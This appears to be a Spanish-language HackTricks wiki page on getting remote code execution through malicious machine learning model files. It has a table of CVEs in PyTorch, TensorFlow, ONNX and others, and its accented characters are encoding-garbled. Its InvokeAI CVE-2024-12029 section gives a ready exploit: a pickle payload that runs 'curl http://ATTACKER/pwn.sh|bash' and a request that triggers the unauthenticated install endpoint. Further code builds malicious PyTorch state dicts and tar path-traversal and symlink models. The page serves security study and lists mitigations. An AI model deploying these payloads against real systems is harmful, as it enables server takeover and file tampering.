# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Cargando modelos a RCE

Los modelos de Machine Learning generalmente se comparten en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden ser cargados en las m√°quinas de los desarrolladores o en sistemas de producci√≥n para ser utilizados. Por lo general, los modelos no deber√≠an contener c√≥digo malicioso, pero hay algunos casos en los que el modelo puede ser utilizado para ejecutar c√≥digo arbitrario en el sistema como una caracter√≠stica prevista o debido a una vulnerabilidad en la biblioteca de carga de modelos.

En el momento de la redacci√≥n, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Tool**        | **Vulnerabilidad (CVE si est√° disponible)**                                                    | **Vector RCE**                                                                                                                           | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserializaci√≥n insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el punto de control del modelo conduce a la ejecuci√≥n de c√≥digo (eludiendo la salvaguarda `weights_only`)          | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de modelo malicioso causa ejecuci√≥n de c√≥digo; RCE de deserializaci√≥n de Java en la API de gesti√≥n                      | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML utiliza `yaml.unsafe_load` (ejecuci√≥n de c√≥digo) <br> Cargar modelo con capa **Lambda** ejecuta c√≥digo Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (an√°lisis de TFLite)                                                                                          | Modelo `.tflite` manipulado provoca desbordamiento de enteros ‚Üí corrupci√≥n de heap (potencial RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo a trav√©s de `joblib.load` ejecuta pickle con la carga √∫til `__reduce__` del atacante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                              | `numpy.load` por defecto permit√≠a arreglos de objetos pickleados ‚Äì `.npy/.npz` maliciosos provocan ejecuci√≥n de c√≥digo                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de directorios) <br> **CVE-2024-5187** (traversal de tar)                                                    | La ruta de pesos externos del modelo ONNX puede escapar del directorio (leer archivos arbitrarios) <br> Modelo ONNX malicioso tar puede sobrescribir archivos arbitrarios (conduciendo a RCE) | |
| ONNX Runtime (riesgo de dise√±o)  | *(Sin CVE)* operaciones personalizadas de ONNX / flujo de control                                                                                    | Modelo con operador personalizado requiere cargar el c√≥digo nativo del atacante; gr√°ficos de modelo complejos abusan de la l√≥gica para ejecutar c√°lculos no intencionados   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de ruta)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite traversal de ruta relativa para escribir archivos (por ejemplo, sobrescribir `.bashrc` para RCE)    | |
| **GGML (formato GGUF)**      | **CVE-2024-25664 ‚Ä¶ 25668** (m√∫ltiples desbordamientos de heap)                                                                         | Archivo de modelo GGUF malformado causa desbordamientos de buffer en el parser, habilitando la ejecuci√≥n de c√≥digo arbitrario en el sistema v√≠ctima                     | |
| **Keras (formatos antiguos)**   | *(Sin nuevo CVE)* Modelo Keras H5 legado                                                                                         | Modelo HDF5 malicioso (`.h5`) con c√≥digo de capa Lambda a√∫n se ejecuta al cargar (el modo seguro de Keras no cubre el formato antiguo ‚Äì ‚Äúataque de degradaci√≥n‚Äù) | |
| **Otros** (general)        | *Falla de dise√±o* ‚Äì serializaci√≥n de Pickle                                                                                         | Muchas herramientas de ML (por ejemplo, formatos de modelo basados en pickle, `pickle.load` de Python) ejecutar√°n c√≥digo arbitrario incrustado en archivos de modelo a menos que se mitigue | |

Adem√°s, hay algunos modelos basados en pickle de Python, como los utilizados por [PyTorch](https://github.com/pytorch/pytorch/security), que pueden ser utilizados para ejecutar c√≥digo arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podr√≠a ser especialmente susceptible a este tipo de ataques, incluso si no est√°n listados en la tabla anterior.

### üÜï  InvokeAI RCE a trav√©s de `torch.load` (CVE-2024-12029)

`InvokeAI` es una popular interfaz web de c√≥digo abierto para Stable-Diffusion. Las versiones **5.3.1 ‚Äì 5.4.2** exponen el endpoint REST `/api/v2/models/install` que permite a los usuarios descargar y cargar modelos desde URLs arbitrarias.

Internamente, el endpoint eventualmente llama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Cuando el archivo suministrado es un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza una **deserializaci√≥n de pickle**. Debido a que el contenido proviene directamente de la URL controlada por el usuario, un atacante puede incrustar un objeto malicioso con un m√©todo `__reduce__` personalizado dentro del checkpoint; el m√©todo se ejecuta **durante la deserializaci√≥n**, lo que lleva a **ejecuci√≥n remota de c√≥digo (RCE)** en el servidor de InvokeAI.

La vulnerabilidad fue asignada como **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Gu√≠a de explotaci√≥n

1. Crear un checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Aloja `payload.ckpt` en un servidor HTTP que controlas (por ejemplo, `http://ATTACKER/payload.ckpt`).
3. Activa el endpoint vulnerable (no se requiere autenticaci√≥n):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Cuando InvokeAI descarga el archivo, llama a `torch.load()` ‚Üí el gadget `os.system` se ejecuta y el atacante obtiene ejecuci√≥n de c√≥digo en el contexto del proceso InvokeAI.

Explotaci√≥n lista para usar: **M√≥dulo Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo el flujo.

#### Condiciones

‚Ä¢  InvokeAI 5.3.1-5.4.2 (bandera de escaneo por defecto **false**)
‚Ä¢  `/api/v2/models/install` accesible por el atacante
‚Ä¢  El proceso tiene permisos para ejecutar comandos de shell

#### Mitigaciones

* Actualizar a **InvokeAI ‚â• 5.4.3** ‚Äì el parche establece `scan=True` por defecto y realiza un escaneo de malware antes de la deserializaci√≥n.
* Al cargar puntos de control program√°ticamente, usar `torch.load(file, weights_only=True)` o el nuevo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Hacer cumplir listas de permitidos / firmas para fuentes de modelos y ejecutar el servicio con el menor privilegio.

> ‚ö†Ô∏è Recuerda que **cualquier** formato basado en pickle de Python (incluyendo muchos archivos `.pt`, `.pkl`, `.ckpt`, `.pth`) es inherentemente inseguro para deserializar desde fuentes no confiables.

---

Ejemplo de una mitigaci√≥n ad-hoc si debes mantener versiones m√°s antiguas de InvokeAI ejecut√°ndose detr√°s de un proxy inverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Ejemplo ‚Äì creando un modelo malicioso de PyTorch

- Crear el modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para la Traversal de Rutas

Como se coment√≥ en [**esta publicaci√≥n del blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la mayor√≠a de los formatos de modelos utilizados por diferentes marcos de IA se basan en archivos comprimidos, generalmente `.zip`. Por lo tanto, podr√≠a ser posible abusar de estos formatos para realizar ataques de traversal de rutas, permitiendo leer archivos arbitrarios del sistema donde se carga el modelo.

Por ejemplo, con el siguiente c√≥digo puedes crear un modelo que crear√° un archivo en el directorio `/tmp` cuando se cargue:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
O, con el siguiente c√≥digo puedes crear un modelo que crear√° un symlink al directorio `/tmp` cuando se cargue:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Referencias

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
